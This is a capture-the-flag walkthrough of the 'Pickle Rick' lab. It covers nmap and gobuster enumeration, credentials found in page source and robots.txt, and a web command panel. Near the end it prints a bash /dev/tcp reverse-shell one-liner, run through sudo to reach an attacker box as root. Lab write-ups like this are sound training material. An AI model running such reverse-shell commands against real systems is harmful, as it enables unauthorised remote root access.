<blockquote>
<b>PICKLE RICK</b><br><br>
  - First i did a nmap scan with:<br>
  <pre>
    $ nmap -sC -sV -vv 10.48.189.232
  </pre>
  - We can see a web-server is running on port 80.<br>
  <br><img width="1038" alt="image" src="https://github.com/user-attachments/assets/c1241733-4494-4f26-9982-eba69c94abf2" /><br>
  - So we visit the site in firefox.Upon reviewing the page source code i found something interesting.<br>
  <br><img width="411" alt="image" src="https://github.com/user-attachments/assets/317c4a6d-b462-4cdb-aadb-2118b496dde0" /><br><br>
  - Username: R1ckRul3s (We might need this later).<br>
  - Then i try to enumerate directories using gobuster with:<br>
  <pre>
    $ gobuster dir -u http://10.48.189.232 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
  </pre>
  - I found only one directory.<br>
  <br><img width="1235" alt="image" src="https://github.com/user-attachments/assets/7d92bbd4-431d-49ce-a546-dcb355c7c881" /><br><br>
  - Next i try to find any files :<br>
  <pre>
    $ gobuster dir -u http://10.48.189.232 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -x .txt,.php,.js
  </pre>
  - I found some interesting files.<br>
  <br><img width="1273" alt="image" src="https://github.com/user-attachments/assets/8e193e0b-75f8-49e6-965f-5960f8c63f5f" /><br>
  - On '/robots.txt' endpoint we can see: Wubbalubbadubdub (this is the password of the username we found before).<br>
  <br><img width="1279" alt="image" src="https://github.com/user-attachments/assets/7e08adae-be72-4a31-a8ba-d9b5ace2a339" /><br>
  - Then i navigated to '/login.php' and was asked for username and password.Here we have to put:
  <pre>
    Username: R1ckRul3s
    Password: Wubbalubbadubdub
  </pre>
  - Login is successful and we encounter 'command panel'<br>
  <br><img width="1279" alt="image" src="https://github.com/user-attachments/assets/8ca3da63-50d1-4525-a14c-92e5417f334b" /><br>
  - Here we can execute commands.<br>
  - I list all files in current directory:<br>
  <br><img width="1284" alt="image" src="https://github.com/user-attachments/assets/1157cd05-4acb-4506-a126-9666286bbb72" /><br>
  - As we can see there is a file named 'Sup3rS3cretPickl3Ingred.txt' .However we cannot use 'cat Sup3rS3cretPickl3Ingred.txt' to read content of that file.To see the content we have to navigate to '/Sup3rS3cretPickl3Ingred.txt':<br>
  <br><img width="1283" height="690" alt="image" src="https://github.com/user-attachments/assets/7773b2b4-f4e1-4363-8588-680ebb7784e6" /><br>
  - We got our 'First Ingredient'.<br>
  - Next i ran the below command in command panel:
  <pre>
    $ sudo -l
  </pre>
  - We can see that we can run all commands as root.We will use this to get a reverse shell.<br>
  <br><img width="1282" alt="image" src="https://github.com/user-attachments/assets/f1a8e68b-48d1-4b2e-ae22-0ed7bde39548" /><br>
  - I set up a listener on 1234 port on my attackbox and then inside command panel ran the command:
  <pre>
    $ sudo /bin/bash -c 'bash -i >& /dev/tcp/10.48.116.160/1234 0>&1'
  </pre>
  - And we get a reverse shell as root:<br>
  <br><img width="867" alt="image" src="https://github.com/user-attachments/assets/0433bb1a-309a-412c-80e7-f06424cc2263" /><br>
  - Now we can navigate to '/home/rick' and then cat 'second ingredients' file to get the second ingredient.<br>
  <br><img width="637" alt="image" src="https://github.com/user-attachments/assets/cf4e2a60-087b-49d4-a1d1-e254512c8eaf" /><br>
  - Last ingredient is located in '/root/3rd.txt' file:<br>
  <br><img width="568" alt="image" src="https://github.com/user-attachments/assets/03070b39-7d0a-4a05-848e-890e69daa84d" /><br>
  
